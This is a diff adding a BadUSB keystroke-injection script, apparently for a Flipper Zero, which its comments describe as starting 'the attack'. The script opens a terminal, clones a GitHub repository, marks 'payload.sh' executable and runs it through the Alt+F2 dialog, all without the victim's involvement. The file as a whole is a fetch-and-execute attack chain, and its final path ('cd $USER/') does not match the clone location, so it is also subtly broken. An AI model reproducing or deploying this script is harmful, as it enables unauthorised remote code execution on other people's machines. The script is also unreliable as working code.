@@ -1,0 +1,24 @@
+REM This will be the file used to execute the line that will start the attack
+
+REM This will be the default time to wait between commands
+DEFAULT_DELAY 700
+
+REM This will download the payload with a terminal
+CONTROL ALT T
+STRING cd ~/ && git clone https://github.com/Night4Watcher/flipper_projects.git && cd flipper_projects/server_access && chmod +x payload.sh
+ENTER
+
+REM This will close the terminal opened up to download the payload
+STRING exit
+ENTER
+
+REM This will execute the payload in the system
+ALT F2
+STRING cd $USER/ && ./payload.sh
+ENTER
+
+REM This notifys the user that the script is finalized
+CAPSLOCK
+CAPSLOCK
+CAPSLOCK
+CAPSLOCK
